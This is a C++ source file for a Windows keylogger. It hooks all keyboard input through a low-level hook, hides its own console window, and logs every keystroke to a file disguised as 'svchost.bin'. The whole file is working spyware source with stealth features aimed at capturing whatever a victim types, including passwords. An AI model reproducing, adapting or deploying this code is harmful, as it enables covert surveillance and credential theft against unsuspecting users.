/*
Copyright: Szymon Bialkowski
Date: 02/06/2017
*/

#include <stdio.h>
#include <fstream>
#include <iostream>
#include <string.h>
#include <windows.h>


using std::fstream;
using std::ofstream;
using namespace std;

//Global Keyboard Hook variable
HHOOK keyboardHook;

void WriteData(string Text)
{
    ofstream LogFile;
    LogFile.open("svchost.bin", fstream::app);
    LogFile << Text;
    LogFile.close();
}

bool SpecialCharacters(int vKey)
{
    //If Shift is pressed
    if (GetKeyState(VK_SHIFT) & 0x8000)
    {
         switch(vKey)
        {
            case 9:
                WriteData("<TAB>");
                break;
            case 8:
                WriteData("<BACKSPACE>");
                break;
            case 13:
                WriteData("\n<ENTER>");
                break;
            case 27:
                WriteData("<ESC>");
                break;
            case 46:
                WriteData("<DELETE>");
                break;
            case 48:
                WriteData(")");
                break;
            case 49:
                WriteData("!");
                break;
            case 50:
                WriteData("@");
                break;
            case 51:
                WriteData("#");
                break;
            case 52:
                WriteData("$");
                break;
            case 53:
                WriteData("%");
                break;
            case 54:
                WriteData("^");
                break;
            case 55:
                WriteData("&");
                break;
            case 56:
                WriteData("*");
                break;
            case 57:
                WriteData("(");
                break;
            case -64:
                WriteData("~");
                break;
            case -67:
                WriteData("_");
                break;
            case -69:
                WriteData("+");
                break;
            case -70:
                WriteData(":");
                break;
            case -34:
                WriteData("\"");
                break;
            case -68:
                WriteData("<");
                break;
            case -66:
                WriteData(">");
                break;
            case -65:
                WriteData("?");
                break;
            default:
                return false;
        }
        return true;
    }
    //If Shift is unpressed
    else
    {
        if (vKey > 47 && vKey < 58)
        {
            switch (vKey)
            {
                case 48:
                    WriteData("0");
                    break;
                case 49:
                    WriteData("1");
                    break;
                case 50:
                    WriteData("2");
                    break;
                case 51:
                    WriteData("3");
                    break;
                case 52:
                    WriteData("4");
                    break;
                case 53:
                    WriteData("5");
                    break;
                case 54:
                    WriteData("6");
                    break;
                case 55:
                    WriteData("7");
                    break;
                case 56:
                    WriteData("8");
                    break;
                case 57:
                    WriteData("9");
                    break;

            }
        }
        switch (vKey)
        {
            case 9:
                WriteData("<TAB>");
                break;
            case 8:
                WriteData("<BACKSPACE>");
                break;
            case 13:
                WriteData("\n<ENTER>");
                break;
            case 32:
                WriteData(" ");
                break;
            case -95:
                WriteData("<SHIFT>");
                break;
            case -96:
                WriteData("<SHIFT>");
                break;
            case -66:
                WriteData(".");
                break;
            case -68:
                WriteData(",");
                break;
            case -67:
                WriteData("-");
                break;
            case 27:
                WriteData("<ESC>");
                break;
            case -69:
                WriteData("=");
                break;
            case 38:
                WriteData("↑");
                break;
            case 40:
                WriteData("↓");
                break;
            case 37:
                WriteData("←");
                break;
            case 39:
                WriteData("→");
                break;
            case 46:
                WriteData("<DELETE>");
                break;
            case -70:
                WriteData(";");
                break;
            case -34:
                WriteData("'");
                break;
            default:
                return false;
        }
        return true;
    }
}


void Log(char Key)
{
    //Check for special characters (Shift, Enter etc.)
    if (SpecialCharacters(Key) == false)
    {
        //If not special character check A-Z
        if (Key > 64 && Key < 91)
        {
            //If Shift  AND  Caps Lock = Lowercase
            if (GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001)!=0)
            {
                Key += 32;
                ofstream LogFile;
                LogFile.open("svchost.bin", fstream::app);
                LogFile << Key;
                LogFile.close();
            }
            //If Shift OR Caps Lock = Uppercase
            else if (GetKeyState(VK_SHIFT) & 0x8000 || (GetKeyState(VK_CAPITAL) & 0x0001)!=0)
            {
                ofstream LogFile;
                LogFile.open("svchost.bin", fstream::app);
                LogFile << Key;
                LogFile.close();
            }
            //No Shift or Caps Lock = Lowercase
            else
            {
                Key += 32;
                ofstream LogFile;
                LogFile.open("svchost.bin", fstream::app);
                LogFile << Key;
                LogFile.close();
            }
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION )
    {
        //Pass keystroke character into Log function
        char Key = key->vkCode;
        Log(Key);
    }
    //Wait for next keystroke
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


int main()
{
    //Ensure window hides if .exe is run
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    //Initialise the keyboard Hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

    //Initialise MSG struct values to 0
    MSG message{0};

    //Waits for user input
    while (GetMessage(&message, NULL, 0, 0) != 0)
    {
        UnhookWindowsHookEx(keyboardHook);
    }
    return 0;
}
